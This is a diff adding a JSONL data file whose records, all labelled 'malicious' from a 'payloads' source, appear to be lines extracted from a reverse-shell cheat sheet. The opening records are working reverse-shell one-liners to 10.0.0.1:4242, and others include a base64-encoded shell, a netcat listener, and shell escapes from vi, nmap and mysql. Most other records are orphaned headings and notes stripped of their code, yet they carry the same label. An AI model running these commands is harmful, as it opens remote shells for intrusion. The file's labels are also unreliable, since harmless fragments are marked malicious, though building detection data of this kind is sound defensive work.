@@ -1,0 +1,45 @@
+{"text": "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1", "source": "payloads", "label": "malicious"}
+{"text": "0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196", "source": "payloads", "label": "malicious"}
+{"text": "/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1", "source": "payloads", "label": "malicious"}
+{"text": "sh -i >& /dev/udp/10.0.0.1/4242 0>&1", "source": "payloads", "label": "malicious"}
+{"text": "nc -u -lvp 4242", "source": "payloads", "label": "malicious"}
+{"text": "Static socat binary can be found at [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)", "source": "payloads", "label": "malicious"}
+{"text": "Linux only", "source": "payloads", "label": "malicious"}
+{"text": "IPv4", "source": "payloads", "label": "malicious"}
+{"text": "IPv4 (No Spaces)", "source": "payloads", "label": "malicious"}
+{"text": "IPv4 (No Spaces, Shortened)", "source": "payloads", "label": "malicious"}
+{"text": "IPv4 (No Spaces, Shortened Further)", "source": "payloads", "label": "malicious"}
+{"text": "IPv6", "source": "payloads", "label": "malicious"}
+{"text": "IPv6 (No Spaces)", "source": "payloads", "label": "malicious"}
+{"text": "IPv6 (No Spaces, Shortened)", "source": "payloads", "label": "malicious"}
+{"text": "Windows only (Python2)", "source": "payloads", "label": "malicious"}
+{"text": "Windows only (Python3)", "source": "payloads", "label": "malicious"}
+{"text": "TLS-PSK (does not rely on PKI or self-signed certificates)", "source": "payloads", "label": "malicious"}
+{"text": "**NOTE**: This is more stealthy", "source": "payloads", "label": "malicious"}
+{"text": "Windows and Linux", "source": "payloads", "label": "malicious"}
+{"text": "With `YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80MjQyIDA+JjEnCg==` decoding to `bash -c 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'`, the payload within the single quotes might be changed by any Linux-compatible reverse shell.", "source": "payloads", "label": "malicious"}
+{"text": "by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)", "source": "payloads", "label": "malicious"}
+{"text": "NOTE: Java reverse shell also work for Groovy", "source": "payloads", "label": "malicious"}
+{"text": "Compile with `gcc /tmp/shell.c --output csh && csh`", "source": "payloads", "label": "malicious"}
+{"text": "In order to catch a shell, you need to listen on the desired port. `rlwrap` will enhance the shell, allowing you to clear the screen with `[CTRL] + [L]`.", "source": "payloads", "label": "malicious"}
+{"text": "Sometimes, you want to access shortcuts, su, nano and autocomplete in a partially tty shell.", "source": "payloads", "label": "malicious"}
+{"text": ":warning: OhMyZSH might break this trick, a simple `sh` is recommended", "source": "payloads", "label": "malicious"}
+{"text": "> The main problem here is that zsh doesn't handle the stty command the same way bash or sh does. [...] stty raw -echo; fg[...] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect", "source": "payloads", "label": "malicious"}
+{"text": ":warning: With Windows Terminal + WSL container,  `[CTRL] + [Z]` can get you out of / freeze the container.", "source": "payloads", "label": "malicious"}
+{"text": "To overcome this issue, run `nc` in a `tmux`, and send a `SIGTSTP` signal to the `nc` process.", "source": "payloads", "label": "malicious"}
+{"text": "or use `socat` binary to get a fully tty reverse shell", "source": "payloads", "label": "malicious"}
+{"text": "Alternatively, `rustcat` binary can automatically inject the TTY shell command.", "source": "payloads", "label": "malicious"}
+{"text": "The shell will be automatically upgraded and the TTY size will be provided for manual adjustment.", "source": "payloads", "label": "malicious"}
+{"text": "Not only that, upon exiting the shell, the terminal will be reset and thus usable.", "source": "payloads", "label": "malicious"}
+{"text": "Spawn a TTY shell from an interpreter", "source": "payloads", "label": "malicious"}
+{"text": "* vi: `:!bash`", "source": "payloads", "label": "malicious"}
+{"text": "* vi: `:set shell=/bin/bash:shell`", "source": "payloads", "label": "malicious"}
+{"text": "* nmap: `!sh`", "source": "payloads", "label": "malicious"}
+{"text": "* mysql: `! bash`", "source": "payloads", "label": "malicious"}
+{"text": "Alternative TTY method", "source": "payloads", "label": "malicious"}
+{"text": "The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.", "source": "payloads", "label": "malicious"}
+{"text": "**ConPtyShell uses the function [CreatePseudoConsole()](https://docs.microsoft.com/en-us/windows/console/createpseudoconsole). This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).**", "source": "payloads", "label": "malicious"}
+{"text": "Server Side:", "source": "payloads", "label": "malicious"}
+{"text": "Client Side:", "source": "payloads", "label": "malicious"}
+{"text": "Single line :", "source": "payloads", "label": "malicious"}
+{"text": "Expanded version :", "source": "payloads", "label": "malicious"}
